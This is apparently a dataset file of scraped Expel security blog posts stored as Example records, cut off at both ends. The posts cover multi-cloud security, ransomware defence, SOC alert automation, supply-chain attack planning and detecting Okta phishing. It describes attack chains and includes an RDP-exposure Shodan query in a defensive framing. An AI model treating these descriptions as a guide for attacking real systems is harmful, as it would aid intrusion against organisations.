each manager has unlimited 1:1 sessions with a BetterUp coach to discuss issues and goals they choose. These are the three core parts of our BUILD program  for now. Its important to be adaptable, especially in these uncertain times, and this design is by no means set in stone. We rely on feedback from our managers on whats useful and what else theyre interested in learning. We believe dialogue is key. So as we move forward, well continue having conversations with our managers to ensure they get what they need to successfully BUILD great management skills. What have you found most helpful in your own management journey? Wed love to hear .'}) (input_keys={'title'}),
  Example({'title': "So you've got a multi-cloud strategy; here's how to navigate ...", 'url': 'https://expel.com/blog/multi-cloud-strategy-four-security-challenges/', 'date': 'Jun 25, 2020', 'contents': 'Subscribe  EXPEL BLOG So youve got a multi-cloud strategy; heres how to navigate four five common security challenges Tips  7 MIN READ  ANDREW PRITCHETT, IAN COOPER AND BRANDON DOSSANTOS  JAN 12, 2023  TAGS: Cloud security / Managed detection and response / Selecting tech / Tools This blog was originally posted on Jun 25, 2020 and was updated by Ian Cooper and Brandon Dossantos in January 2023 to include a fifth(!) cloud security challenge. I once attended a week-long training seminar on cloud security architecture. The audience included a few security engineers, security architects and a larger group of security administrators and CISOs. Our instructor kicked off the session with a few questions. First up: How many of you are actively using a cloud platform at work? All but maybe two or three attendees raised their hands. He then asked how many were using Amazon Web Services (AWS), Microsoft Azure and Google Cloud Platform (GCP), respectively, and then polled the room for any other cloud platforms used. After each question, attendees quickly raised their hand in response. Then came: How many of you are actively using two or more cloud platforms at work? Some of the cloud engineers hands went up immediately, a few of the security architects slowly and apprehensively put their hands up, and I could tell that many of the security administrators were simply struggling to decide whether they should have a hand up or not. Ah, dont worry about it, the instructor joked. If your hand is not up yet, it will be the next time youre asked! Those with their hands in the air laughed knowingly. And the rest of the room dropped their foreheads toward the desks in front of them. So whats going on? How is it that some security administrators and CISOs dont know that they have data in several clouds? Thats a whole other story. For most of us, going multi-cloud is inevitable. So lets talk about potential security challenges and how weve helped our customers navigate them so far. Challenge #1: Skills and knowledge gap deficiencies Lets be honest: The technology market has a huge unmet demand for skills. This gap only increases when you require proficiency in cloud computing. Youll have an easier time finding a real, live unicorn than an unemployed person with proficiency in multiple cloud platforms. I try to keep some proficiency across multiple cloud environments but, admittedly, its really tough. Especially, because cloud platforms are constantly changing and evolving. Trying to be proficient across multiple platforms is like a game of trying to hit fast moving targets. So what does this mean for your organization? Sometimes youll have to make do with the resources you have. Try your best to provide folks with additional training where you can and be patient with your teams as they continually learn and grow in an evolving space. This also means that mistakes may happen. Requiring peer review on change requests is an excellent approach to reduce the likelihood of mistakes happening; however, this assumes that the individual doing the peer review can also identify the mistake. We often see policy changes that present risk to our customers  for example, granting the wrong roles for a storage bucket which exposes the content publicly. Weve witnessed this in AWS environments, and wrote a post all about keeping an eye out for open Amazon S3 buckets (and how to fix em) right here . The policy change is rarely directed from malice, but simply from the fact that the individual performing the action didnt understand the potential ramifications of their policy change. Challenge #2: Auditing differences across cloud providers Every CSP has a different schema for their audit logs. To a multi-cloud practitioner, combing through them can feel like reading a different language as you move from cloud environment to cloud environment. Not to mention that we havent observed an audit to be apples to apples across cloud platforms. We also found that auditing coverage is closely tied to the maturity of the service provided. As these products mature and more use cases are requested, I suspect well see improvement here. Audit logs are generally separated into groupings  administrative activity is generally grouped into one log source while data access and system event activities are separated, respectively. AWS has CloudTrail and CloudWatch while GCP has Admin Activity Logs and Data Access Logs. What specifically divides the activities separated into these different log streams differs slightly by definition from each cloud provider. Also, what logs need to be enabled and configured by the consumer versus what needs to be enabled and configured by the cloud provider varies. Challenge #3: Loss of centralized management of users and role-based access control Say you started with one cloud platform and finally organized all of your users and groups, and got around to defining your policies for least privilege. You were just about to pat yourself on the back when your VP of Engineering tells you, Heres the link to our new cloud platform. The second cloud platform has a slightly different business use case, slightly different business requirements and user base. Now you have to manage identity and access management (IAM) in AWS and IAM in GCP. The services are similar but all of the role names are different and extend slightly different levels of privilege. You have Amazon resource numbers (ARN) in AWS and member IDs in GCP as well as IAM inheritance in GCP and IAM with security groups in AWS. So you cant simply copy over your GCP IAM policy configuration to AWS. Role-based access control (RBAC) can become difficult. You must now remember when you add, modify, or remove privilege for a user in one environment to also reflect that change in your other environment. Not to mention that while youre trying to figure this out, you have engineers going around with company credit cards adding new services and standing up new infrastructure in both environments. Challenge #4: Data overload on security teams CloudTrail Logs, Data Access Logs and virtual private connection (VPC) flow logs; oh my! Literally trillions of logs are now being generated across your multiple cloud environments! In an average three-day period of time, Expel generates about 88 million log events in our GCP environment, not including VPC or System Event Logs. The big question we hear from prospects is, I get a ton of cloud audit logs, way more than wed ever have time to review. What do I actually need to care about? The other question is, What do I do with all of these logs? Ultimately, after all of the work and cost involved in getting all of your logs into a centralized location or SIEM, your team is still drowning in audit logs with multiple schemas and wondering: what actually matters? We even published a post about generating strong security leads from Amazon CloudTrail through a SIEM. Challenge #5: Building a detection strategy based on security incident reports from the wild It can be challenging to find security incident reports in the wild, especially with Azure and GCP. Discussion on security in the cloud vs security of the cloud come to mind when reflecting on famous cases like the CapitalOne breach. To build a strong detection strategy, we need to review past incidents involving security in the cloud (AKA, things that you can actually control). Protecting partners with a variety of cloud infrastructure has given our team a lot of experience in such incidents: AWS  For AWS incidents, we have a variety to choose from. The most popular cloud hosting platform naturally sees the most action. Read about how our SOC investigated privilege escalation from an attacker armed with long term access keys here . Azure  Across all cloud platforms, we see a lot of attempts to deploy generic coin miners. Sometimes the initial lead can appear quite spooky, with analysts ready to respond to hands-on keyboard attackers only to discover that a scanner for vulnerable resources has dropped a generic coinminer. Sometimes, our team actually gets more value out of a simulated attack in the cloud. One red team landed on an Azure VM, and then moved laterally via PostGresql. Communicating with the customer after confirming it was a test- our analysts continued to investigate and observed the red teams efforts in real time. GCP  Not many in-house security teams will have a history of security incidents in GCP to review and use to improve defenses. In one interesting GCP incident, the attacker grabbed a GCP service account key that was committed to a public github repo. Upon acquiring exposed credentials, the attacker attempted to create a new service account key and enable it to maintain persistent access to the customers GCP environment. The attacker attempted to escalate privileges and move laterally using various features with the gcloud cli and SDK. With multiple alarm bells ringing, the SOC jumped in to help the customer remediate and become more resilient to similar attacks in the future. Incidents like these are a gold mine for our team to review attacker behaviors and continue to build upon our detection strategies in the cloud. With a growing arsenal of in-house cloud detections, Detection &amp; Response engineering at Expel greatly values the incident retro process  we work hard to absorb the lessons learned when incidents happen, and analyze every step of the attackers process to hunt for detection gaps. How your third-party security partner should help If you run in multiple CSPs and work with a third-party managed security partner, there are three key ways that provider should be supporting you: Reduce complexity and hopefully costs as well; Provide centralized security management for your decentralized clouds; and Provide you with alerts and answers about whats happening in your environments. Its reasonable to assume that, even if you do have an in-house SOC, not everyone will have expertise in every CSP. Third-party security partners can help you bridge knowledge gaps. It takes a team that continuously applies their learnings to better understand what normal should look like in each security environment. They also need to understand what types of actions can increase risk to your organization and provide you with recommendations to make your organization more resilient in the cloud. But understanding these nuances doesnt happen overnight. This is an area for where a third-party security partner can jump in to boost your expertise. So how do we help our customers here at Expel? Were lucky to have analysts working around the clock who are experienced in investigating security incidents in the cloud. Each investigation helps them gain a depth of knowledge in specific cloud platforms as well as our customers unique environments. As a result, our analysts know where to look and what to look for. They not only pull out the important events from the mountain of cloud security signals but also provide meaningful answers to alerts. Additionally, our detection and response engineers are constantly researching new attack theories, policy changes which present risk to our customers organizations and newly added cloud platform services to always keep cloud alerts up to date and relevant. We monitor cloud security signals and provide customers with a centralized location for all cloud security alerting and investigation. This is the part where you can finally exhale. We get it  this is overwhelming. But dont worry. Remember that there are solutions to this tricky security challenge. Want to talk to a human about how we can help you out? Contact us .'}) (input_keys={'title'}),
  Example({'title': 'Someone in your industry got hit with ransomware. What ...', 'url': 'https://expel.com/blog/someone-in-your-industry-got-hit-with-ransomware-what-now/', 'date': 'Jun 3, 2021', 'contents': 'Subscribe  EXPEL BLOG Someone in your industry got hit with ransomware. What now? Security operations  4 MIN READ  TYLER FORNES  JUN 3, 2021  TAGS: MDR / Tech tools The hits (and headlines) just keep coming. It seems like every week theres a new story about an organization thats become the latest victim of a ransomware attack. When ransomware strikes someone else in your industry, you cant help but think, This couldve just as easily happened to us. Looking across our customer base, 12 percent of the incidents we detected by the Expel Security Operations Center (SOC) in April 2021 had the potential to become a ransomware event. These incidents didnt result in a ransomware event because we stopped them early in the attack lifecycle. The prospect of a ransomware attack is scary. But the good news is that there are plenty of precautions you can take to make your org as secure as possible and resilient against ransomware. Targeted versus opportunistic ransomware: Whats the difference? Whether a sophisticated targeted attack, or a tried and true tactic that dupes users, you should be on the lookout for these two types of ransomware attacks: Opportunistic attacks Unlike targeted attacks, which spend time lurking in an environment for weaknesses, opportunistic attacks prey on orgs that are most likely to not have a strong security posture. These attacks are used to make a quick buck and use cheap tactics like phishing or scanning for and exploiting common public facing vulnerabilities. The difference? A much shorter time to ransom. Once their random attack succeeds, the infection begins and typically spreads very quickly. Similar to targeted attacks, once infected, orgs are forced to exchange money to retrieve their data Weve also seen an increase in opportunistic attacks in recent years and our SOC responded to several opportunistic incidents where an actor scanned the internet for remote access services  like Remote Desktop Protocol (RDP)  that are exposed to the internet. Once identified, the attacker will brute force a weak credential that allows authentication into the server. Then a ransomware payload is uploaded and executed on the machine. This type of attack is often automated and requires no human input to continue to infect thousands of vulnerable machines across the internet. Since this is a spray and pray approach, the goal here is to infect a large number of machines in hopes that a handful of them will end up paying a ransom, instead of targeting and identifying high-value targets. Targeted attacks Crafty attackers looking for a big payoff are starting to get more strategic, and are willing to play the long game to get ahold of important data that orgs cant afford to lose. This means that theyre investing their time in targeting specific orgs (like the healthcare and financial industries) that have the potential to store sensitive data that can draw a large ransom. Targeted ransomware attacks usually also have a longer time to ransom, where the attacker may have broken in months earlier and implanted themselves into the network using a backdoor. Using this access, they may choose to perform reconnaissance and move laterally to a sensitive server before deploying the ransomware. This guarantees the data that will pay the highest ransom is in control of the attackers. Were noticing an increase in targeted attacks  and an increase in the amount of money theyre demanding. In fact, Palo Altos recent 2021 ransomware threat report shows that the amount of money attackers demanded in 2020 DOUBLED from the previous year. Bad actors taking advantage of a terrible and chaotic moment in time? Disappointed but not surprised. From our front lines, we recently saw a targeted campaign against the financial sector that deployed the GOOTKIT loader via a zipped JavaScript file. Once this payload was delivered, we observed the loader deploy a Cobalt Strike BEACON payload which eventually led to the attempted installation of REVIL ransomware. This narrative is becoming the standard for ransomware operations and allows for not only the installation of ransomware, but domain reconnaissance, credential theft and any other capability you would expect from a sophisticated actor. Six things to do right now to guard against a ransomware attack There are specific actions you can take in your environment today to better protect your org against a ransomware attack: Create and test backups regularly: Consider creating and testing backups of data within your org as part of your IT policy. Regularly creating valid backups that arent accessible from your production environment will minimize business disruptions while recovering from ransomware attacks or data loss. The most important part? Test them. As a wise Tweet once said: Test your incident response plan: A real-life security incident isnt the best time to test your incident response (IR) plan. Give yours the stress test regularly  we recommend once a quarter  to make sure you and your team know what to do when a bad thing happens. Dare I say you can even make IR testing fun. We made it far more interesting by turning it into a game. You can read all about Oh Noes!, our IR tabletop game, and download your own starter kit right here. Disable RDP on Internet-facing systems: Dont expose RDP services directly to the internet. Instead, consider putting RDP servers or hosts behind a VPN thats backed by two-factor authentication (2FA). Want to know if you have RDP exposed in your organization? Heres a Shodan query that can help: port:3389 net:1.2.3.4/24 (where 1.2.3.4 is your public IP space in CIDR notation). If RDP is running on a non-standard port in your organization, adjust port:3389 to the non-standard port number. MFA everyone: Multi-factor authentication (MFA) isnt your silver bullet for stopping a ransomware attack, but its still an important part of your security strategy. Add another layer of defense to your org and implement MFA (like Duo or Okta) for everyone. Configure WSH files to open in Notepad: Prevent the double-clicking of evil JavaScript files and configure JScript (.js, .jse), Windows Scripting Files (.wsf, .wsh) and HTML for application (.hta) files to open with Notepad. By associating these file extensions with Notepad, youll mitigate common remote code execution techniques. Pro tip: PowerShell files (.ps1) already open by default in Notepad. Want to test how these files currently open in your environment? These steps work great! Block Microsoft Office Macros: Prevent a user from accidentally running a malicious Office macro. Macros are one of the most common ways an attacker attempts to trick a user into running malicious code that can be used to install malware. This is most commonly seen in phishing attacks, where an attacker will send a seemingly legitimate Microsoft Office document for the user to open. This creates an easy vessel for ransomware delivery if macros are allowed across an enterprise. Not sure what your macro policies currently are set to? Check out the Trust Center Settings in Microsoft Office and adjust appropriately for your organization. We recommend: Better: Disable all Office macros except those that are digitally signed. Best: Disable all Office macros.'}) (input_keys={'title'}),
  Example({'title': 'Spotting suspicious logins at scale: (Alert) pathways to ...', 'url': 'https://expel.com/blog/spotting-suspicious-logins-at-scale/', 'date': 'Jun 2, 2020', 'contents': 'Subscribe  EXPEL BLOG Spotting suspicious logins at scale: (Alert) pathways to success Security operations  8 MIN READ  JON HENCINSKI AND PETER SILBERMAN  JUN 2, 2020  TAGS: Get technical / Managed detection and response / Security Incident / SOC / Vulnerability Spoiler alert: We improved the median time it takes to investigate and report suspicious login activity by 75 percent between October 2019 and March 2020. We did it by reviewing the investigative patterns of our SOC analysts and deploying a ton of automation to enable our team to answer the right questions quickly. Youll see in the chart below that weve managed to reduce the time it takes to investigate a suspicious login to a matter of minutes over that six-month period. Were showing the median and 75th percentile here. TL;DR: Line goes up, more time spent. Line goes down? Efficiency FTW! Time to investigate a suspicious login alert Wondering how we turn repetitive tasks into SOC efficiency? Well walk you through our view of SOC operations and the key metrics we use to understand where were spending too much analyst time on things we should hand off to our robots. But first well take you through how we deployed decision support to reduce the challenge of triaging suspicious login alerts (these can be such a pain if not done correctly, amiright ?). Whats decision support? First things first: Decision support is how we use tech to enable our SOC analysts to answer the right questions about a security event in an easy way. In doing so, we reduce cognitive loading and hand off the highly repetitive tasks to automation (AKA our robots). Its also a key component on how we make sure our analysts arent over subscribed. Pro tip: If you ever go on a SOC tour and the first thing you notice is a lot of sticky notes (hopefully not with passwords on them), thats the opposite of decision support. At Expel decision support is made up of four key components: Automation Contextual enrichment (especially important in the era of cloud automation) Investigation orchestration User interface attributes How do you build decision support? The bottom line is this: Start by understanding where the team needs the most help, now. What we mean by that is figure out the class of alerts that take the team the longest time to investigate. Do you see any patterns? Is the team asking the right questions? You may need to deploy metrics first. Expel believes that effective investigations are rooted in the quality of questions asked, so we look for where our analysts are asking the same great questions over and over again. For example, analysts may find themselves continuously asking questions like: Where has this user previously logged in from? At what times does the user normally log in? And guess what machines are good at? Yup  doing the same thing over and over without a break. It really helps to have good SOC metrics and instrumentation in place before you start down this path. Be strategic by defining where you want to get to and measuring it. Look at metrics and build a cadence around it. Keep in mind that finding great SOC metrics doesnt have to be a complicated endeavor. You just need a group of people sitting down and understanding whats happening. If you do this, youll be in the best position to answer which class of investigation takes the team the longest, and what steps you can automate to make life easier for the team. That said, resist the urge (and encouragement by some) to automate all the things before you have metrics and understand what its like to do those activities manually. To help you calibrate, below is a high-level diagram of our own alert management process. Expel SOC system diagram And here are some Cliffs notes on how to interpret the diagram above: There are six paths. Each path contains a percentage of the capacity utilization for the month recorded. Robots: Youve heard us mention our robots in previous posts . We ingest security signals from a wide variety of tech and process those events through our detection engine (youll notice in the diagram above that weve named this robot Josie). Triage: Security events that match a specific criterias generate an alert that is sent to a SOC analyst for human judgement. You see in that diagram that 50 percent of the capacity we utilized was spent here for the month recorded. An alert can take one of three paths: Close: The alert is a false positive. Nothing to see here. I can also mark when Tuning is required on an alert. Incident: The alert is a true positive. Move to incident and respond. Investigate: After looking at the alert, Im not sure. I need additional data before I make a call. An Investigation can take one of two paths: Close: After additional investigating, the alert was in fact a false positive. Notify: After additional investigating, the activity in question is suspicious enough where wed want to tell a customer about it. We then have a set of metrics for each phase. Some of the metrics are the usual suspects, like the time between when an alert is fired and when an analyst picks it up. But when were looking for decision support opportunities there are two metrics that we zoom in on: Whats the percentage of alerts, based on the alert type, that move to the investigate bucket? Recall our SOC diagram above. Were examining the pathway of alerts. Do we move Suspicious Login alerts to the investigation bucket 50 percent of the time? This suggests that theres not enough information in the alert to make a call. We then ask: What information is needed? Can we use the data available from various vendors to bring that decorate the alert so that it can be handled in the triage bucket? Or can we use orchestration to go and fetch that one piece of evidence we need to make a call? We optimize triage for speed, efficiency and accuracy because thats where we spend most of our time. Its also a key way we reduce cognitive loading on our SOC analysts. When we move a class of alert to the investigation bucket, how long does it take for the SOC to complete it? Were talking about investigation cycle time. If its taking us more than an hour to complete the investigation into a class of activity, what steps can we automate to improve these times? Well go and review the investigations to see what steps our analysts are taking. Once we spot a pattern, thats the right one, well hand the work off to our robots to do it for us. Note that we never put a timer on our analysts. If it takes us more than an one hour to investigate a class of activity, we use data to spot it and then lead with tech to improve our cycle times. Finally, we review the metrics weekly to monitor progress and spot areas where we need additional tech to improve. Case Study: Suspicious Logins Time to put all of this into practice. Remember to keep our two key metrics in mind  high likelihood to move to investigate and time spent on investigation. We spotted suspicious logins to applications/consoles in the cloud (things like O365 and AWS console authentications). As any security analyst knows, this is a class of alert thats particularly painful. What makes up a suspicious login? To keep things simple its a class of alerts where an authentication is flagged based on context we have from the customer (for example customers tell us where they have employees). We also take into account things like whether its from a known suspicious region, or if its perhaps being accessed through a VPN. Its important to note that because our analysts are reviewing the alerts, our willingness to open the aperture of what makes a login suspicious is higher than if we were simply tossing alerts over the fence for our customers to review (which is the opposite of what Expel does). Heres an example where O365 recorded a failed login from a foreign country due to a conditional access policy: Expel alert for suspicious login pre-optimization Just like any other alert, this is a collection of observations that something may be amiss. Does this tell us anything special? Nope. Lets see if we can answer some of the right questions based on the class of activity using only the evidence within the alert: Key question Able to answer just based on the alert? 1. Where has this user previously logged in from? [font_awesome icon=times] 2. What other accounts has this IP logged into? Were they successful? [font_awesome icon=times] 3. Is this user based out of Aruba? Did they forget to authenticate to the corporate VPN before logging into O365? [font_awesome icon=times] Can we answer key questions by looking at the alert? We sure cant. And so unsurprisingly, a high percentage of alerts related to suspicious login activity were making their way to our investigation bucket. Further, when we examined our alert pathway metrics for suspicious login alerts they told us that about half the time our analysts would spend a ton of time querying SIEM logs and performing other steps to answer key questions. Below are the alert pathways of interest for Suspicious Logins alerts from May 2019: Alert pathway % of alerts following pathway (pre automation) Alert-to-close 61% Pursue as investigations 39% As a next step we examined suspicious login investigations for patterns. We wanted to answer this question: When we move a suspicious login alert to an investigation, what steps are we taking? You can imagine that we were spending a ton of time querying logs in a SIEM to answer the same questions over and over again. We noticed we were spending a ton of time answering the following: Where did the user log in from last? Whats the IP usage type for the source IP address? At what times does the user normally log in? Where has this user previously logged in from? What user-agent was previously observed for this user? What other accounts has this IP logged into? Were they successful? Whats the users role? Are they a member of any groups that could indicate they travel? Do they typically use a VPN? If so, which ones have we seen? So, the conclusion we arrived at was that if these are the questions we need to answer to make sure were making the right decision, well bring this info to the alert automatically . As soon as the alert is generated, our robots (investigation orchestration) will pick it up, grab the data and present it as decision support. Our SOC analysts focus their efforts on making judgement calls and less time grepping through a SIEM. Now when a suspicious login alert fires instead of only presenting the evidence from the alert we use automation to add lots of decision support: Expel alert for suspicious login post-optimization What work do we automate? When a suspicious login alert fires, our robots go and grab: A user authentication histogram that shows at what times a user is normally observed logging in over the past 30 days. A user login activity map that shows the geolocation of previous successful logins, unsuccessful logins and the current login for the user in a weighted bubble map over the past 30 days. A summary of authentication attempts (success and failure) from the source IP address recorded in the alert. A login frequency summary for the user based on region. This shows how often the user is logging in from different IP addresses and the frequency of those logins A user agent summary. This shows the user-agents recorded for the user over the past 30 days. Our robots also grab user details from O365 or G-Suite and MFA device activity to arm our analyst with more context. By asking the right questions and then handing the heavy lifting off to our robots, most suspicious login alerts can be triaged in a matter of minutes. Here are the post automation alert pathway stats for May 2020. Alert pathway % of alerts following pathway (post automation) Alert-to-close 86% (+25%) Pursue as investigations 14% (-25%) Weve made a once painful class of alerts much easier to handle and thats a great outcome for our SOC analysts and our customers. Parting Encouragement Ask the right questions; achieve the desired result. Thats why we created decision support. It makes it super easy to answer the right questions. Remember, decision support is not sticky notes. It starts with a group of people sitting down and understanding whats happening and where we need to adjust. It really helps to have good SOC metrics in place before you start down this path. Draw the big picture and start to zoom in on areas where you think the team might be struggling.'}) (input_keys={'title'}),
  Example({'title': 'Supply chain attack prevention: 3 things to do now', 'url': 'https://expel.com/blog/supply-chain-attack-prevention-3-things-to-do-now/', 'date': 'Jan 11, 2021', 'contents': 'Subscribe  EXPEL BLOG Supply chain attack prevention: 3 things to do now Threat Intelligence  6 MIN READ  BRUCE POTTER  JAN 11, 2021  TAGS: Cloud security / MDR / Tech tools You cant trust the internet. As a security professional, youve likely figured that out already. But it turns out that we do place a lot of trust in the software and services we access each day. We expect them to: Provide us with the functionality we want; and Function properly (without allowing bad things to happen) At the core, this is what we mean when we talk about integrity of a computing platform. It should only do what we intend and not things we dont intend. For instance, if I have an enterprise monitoring system, I expect it to do appropriate monitoring of things and not provide a backdoor for external threat actors to access my network. Thats the nature of what happened in the SolarWinds Orion incident , and there are many similar examples of other supply chain incidents that have left security professionals everywhere reeling. Sure, weve all built abstractions such as security assessments and third-party risk management programs to attempt to manage the potential risks associated with our systems, but the reality is the fate of our enterprises are often in other peoples hands. When we think about cyber attacks, we often wonder: What if Im attacked? But this recent cyber attack reminds us that we also need to ask: What if I lose trust in the tech I rely on to keep my org safe? Lets talk about what we do at Expel to prepare for moments when trust is broken, how I think this translates to what weve observed and learned from the SolarWinds Orion breach and what you can do to be prepared against supply chain attacks in the future. How to prepare for a supply chain attack: Run a tabletop exercise Theres a common pattern with threat actors: they pick out a target, phish them, get access and then carry out their nefarious deeds. It might be ransomware, it might be data theft or it might be for intelligence purposes. Whatever the reason, one things for sure: youre the target and you have to deal with the consequences. But what if a provider that a large percentage of the internet relies on is compromised? These types of attacks have dramatically different impacts on an organization and the response can be very different than whats covered in a standard incident response (IR) plan. To prepare for this type of situation, Expel runs tabletop exercises periodically. The particular simulation Im thinking of is one in which we presented that CircleCI went out of business. (For those who arent familiar, CircleCI is a SaaS solution that helps developers integrate and deploy code in a streamlined and automated way, and claims over 30 thousand customers running over a million builds a day.) Note that during these simulations, I give incomplete information. During this exercise, the facts presented to the team lead them to believe that they hadnt gone out of business but had in fact been completely compromised. Being the good facilitator I am, I let the team run with that idea, and the results were pretty fascinating. To be clear, this was a simulation  CircleCI, of course, did not go out of business. The key in creating an effective exercise is to make up a scenario that would wreak havoc on your org so that every team member gets a chance to both think creatively and flex their IR muscles. And thats what I did here. After we got over the oh no moment of knowing the CI provider was compromised, we had to grapple with the potential impact an attack like this could potentially have. Not only could we not trust our code running in production, but we couldnt trust the code running in production of CircleCIs 30 thousand customers. Thats a big problem  CircleCI has a lot of big brand customers like Docker and Facebook, and well as supporting SaaS solutions of all shapes and sizes around the world. We faced a situation where we could no longer trust the Internet in the way we had; not for production services, not for productivity solutions, not for back office systems. The problem for the team became, how do we continue to deliver Expels services in this new reality? The discussions during the tabletop around business continuity, communications and customer interactions were unlike any we had had in previous tabletops. We focused on: Figuring out where trustworthy artifacts existed in order to reconstitute our production environment from scratch. From there, we examined what external services we were willing to continue to use and what services we had to walk away from immediately. Rearchitecting the entire production environment on the fly in an attempt to keep our service viable while ensuring our customers networks werent in jeopardy. If anyone from CircleCI is reading this, hi! We love you and wish your team well. This was just a tabletop and not at all a reflection of how we view CircleCIs security program. A look at how supply chain attacks are evolving: SolarWinds Orion Fast forward from when we ran our CircleCI simulation to December 2020, and we are faced with a similar real-life example with SolarWinds Orion. While not quite the same as having your CI provider popped, it still had the potential to impact enough organizations at a deep enough level that we nearly experienced a cant trust the Internet moment. While it looks like a relatively small number of companies had direct malicious actions against them, the cybersecurity community is still sorting it all out. But many of us are in fact reflecting on the trust we put in our providers, software and hardware. With still unknowns about which companies and agencies are compromised and the current state of those networks, rethinking what services we rely on and the location of data means having discussions with businesses weve never had before. Contrast this to the attacks we saw in the 2010 timeframe. Both the Google Aurora-style attacks as well attacks against the Defense Industrial Base (DIB) were well coordinated and sophisticated. These were also highly targeted attacks launched against high-value organizations and subverted trust in the core of the systems in many of these enterprises. Having dealt with some of those intrusions personally, I will say recovery from them was difficult and expensive for many organizations and resulted in large scale changes in how they thought about security. What were seeing in 2020 is much different. For starters, the impact of the SolarWinds Orion hack isnt targeted in the same way. Rather than having a few providers to worry about, we have 18 thousand that may have been compromised. So thinking about reducing exposure to this attack has a very different feel than what we dealt with in 2010. On the flip side, we have much better security signal now than we had in 2020. Endpoint monitoring and interrogation technology has improved dramatically. For cloud based workloads, we have the ability to introspect on them from underneath. For example, services like CloudTrail and GuardDuty from Amazon Web Services (AWS) give us simple, detailed information about what is executing where and providing high fidelity detection information. Unlike 2010, even when we knew bad actors were in the network and we couldnt find them, better instrumentation helped many of the 18 thousand impacted companies take publicly available information about these attacks and rapidly determine either, yep, we were compromised or seems pretty unlikely we were compromised. Being 100 percent sure is not possible, but today we can have a much higher degree of assurance than we could in the past. 3 things you can do right now to better protect your org against a supply chain attack The impact of the SolarWinds Orion hack will be felt for years to come. This is a somewhat rare event that causes organizations to lose trust in many systems and services all at once. However, its critical we use this time to learn lessons and prepare for the next large scale event that causes us to question the integrity of huge swaths of the Internet. Because its a given that we will have another one of these moments. Its possible to prepare for these events, but it requires a different kind of response than what you might normally plan or table-top for. Here are some things you can do: Plan for supply chain attacks  The word supply chain can mean different things to different orgs, but for many tech companies, your supply chain is a long list of cloud services that facilitate your day-to-day business. Have plans for alternative supply chain providers  Were not saying you need to have a hot backup for all your cloud services. But you should at least plan for potentially rapid provider shifts if a catastrophic event happens. This should be largely in line with your business continuity plans (which youve tested, right?). Be creative  Failures of imagination are a real thing. And it can be very difficult to dream up attacks like SolarWinds Orion or vulnerabilities like Heart Bleed. When planning tabletops, ask people around your company: Whats the worst thing that could happen? You might be surprised at the scenarios others are worrying about.'}) (input_keys={'title'}),
  Example({'title': 'Swimming past 2FA, part 1: How to spot an Okta MITM ...', 'url': 'https://expel.com/blog/2fa-part-1-how-to-spot-okta-mitm-phishing-attack/', 'date': 'Jul 13, 2021', 'contents': 'Subscribe  EXPEL BLOG Swimming past 2FA, part 1: How to spot an Okta MITM phishing attack Security operations  4 MIN READ  JOSHUA KIM, EVAN REICHARD AND ASHWIN RAMESH  JUL 13, 2021  TAGS: Cloud security / MDR Credentials phishing attacks are on the rise and bad actors are finding new and creative ways to bypass multi-factor authentication (MFA). This trend isnt surprising  a large percentage of people abruptly switched to remote work last year. And attackers didnt waste time in taking advantage of the upheaval. Weve noticed that one multi-factor authentication solution in particular caught the eye of attackers  Okta. Why Okta? Orgs that use Okta rely on its authentication and access management feature to grant users access to their apps. This is the holy grail for a threat actor, giving them a one-stop shop to access multiple apps that can be used to stage an attack or exfiltrate data. We sounded the alarm about this trend in an infographic . But what do these types of attacks look like? Missed the infographic? Click here. Thats what were going to cover here. In this two-part blog series, were going to share an example of an Okta phishing attack that we responded to in our security operations center (SOC). The attacker used a man-in-the-middle (MITM) tactic to send users to a fake Okta login page. This post will go over how we detected that a users credentials were compromised, how you can spot a phony Okta page and well share some tips on how your org can stay resilient against these types of attacks. Well follow up with a deep dive into our investigative process in the second part of this series  so stay tuned! Phishing for credentials So, what happened? Attackers emailed a link to a fake Okta login page from the email service provider, SendGrid. If a user submitted their credentials using the fake Okta page, they were redirected to a page masquerading as the Duo Security MFA page that was hosted by the attacker. While the org had configured two-factor authentication (2FA), the attackers phishing campaign and social engineering successfully circumvented existing security controls by hijacking the users authenticated network sessions. Spotting a fake Okta page The fake Okta login page mirrored settings of the users workplace, like the orgs logo, and was convincing enough to leave them unaware that they werent logging into their normal login page. But there were some telltale signs that this was a phishing attempt. Lets look at the fake login and two-factor authentication pages that were created. Do you notice anything strange? The fake Okta login and two-factor pages. Once we started our investigation, here are some things we noticed right off the bat: The attacker-owned phishing site was using the non-secure HTTP over HTTPS. The attacker-owned site didnt render the security image or the default avatar picture when entering a username. The Remember Me option was missing the checkbox. The attacker used similar but not exactly the same language on their page. The attacker-owned site said Need sign-in assistance? while a real Okta page reads Need help signing in? The bottom left hyperlink should state, Powered by Okta not OktaPowered by. Other things seemed off, and we noted minor details like different font style and sizes between the respective texts. Detecting Duo malicious logins During initial triage, we started to dig into how the users credentials were compromised. We noticed that there were two devices (and their IP addresses) in the Duo Authentication Logs associated with a Duo Push Authentication event: Access Device  The device from which the user is requesting the Duo Push. Authentication Device  The device approving or rejecting the Duo Push. For a legitimate authentication event, we can assume that the access device and the authentication device are in close proximity to each other, and since we have the IP addresses of both devices, we can build a detection off this assumption. An example SIEM query-based rule is provided below. SIEM query-based rule The first step was to get a geographical location from the IP addresses. We did this by enriching the IP addresses using SumoLogics geo://location operator. This gave us the latitude, longitude and the country codes of both IP addresses. We then used an additional SumoLogic feature called haversine , which allows us to determine the birds-eye distance between two geographical coordinates. Finally, using the newly derived distance and country of origin for both the access and authentication device, we can generate an alert if the countries differ or if the distance between the two devices exceeds a determined length. This doesnt mean that there arent false positives. Some organizations use various VPNs/proxies that could cause a legitimate login to appear illegitimate. For example, if the user happens to be using a VPN on their phone or authentication device, it could fire an alert if the devices arent recognized. At Expel, were able to mitigate some of the false positives by hooking this detection into a context database. This allows us to suppress the alert if one of the IP addresses is originating from a known and authorized VPN or network egress point. 4 tips on how you can prevent credentials phishing While the tried and true methods of phishing attacks, like business email compromise (BEC), persist  phishing tactics are getting more sophisticated. And well likely see more instances of phishing or credentials phishing similar to this attack in the future. Beyond implementing best security practices for Okta (enabling MFA, network blocklisting, enforcing complex passwords, enabling email notifications for end users and device trust), updating your security awareness training when a new type of attack is identified can help reduce your phishing triage-related headaches. There are four things that you can share with your employees to ensure they dont fall victim to this type of attack: Enforce MFA prompts when users connect to sensitive apps via app-level MFA. Dont make your Okta a one-stop shop for an attacker. Protect your sensitive apps with additional MFA to help add another layer of defense. Remind your users to make note of and remember the security image tied to their Okta account on the sign in page. If your users dont see or recognize their chosen security image, they might be on a fraudulent page. Tell your users to always review the source of the 2FA request (if via push notification) to verify if the login is from the expected region/area. If they get an 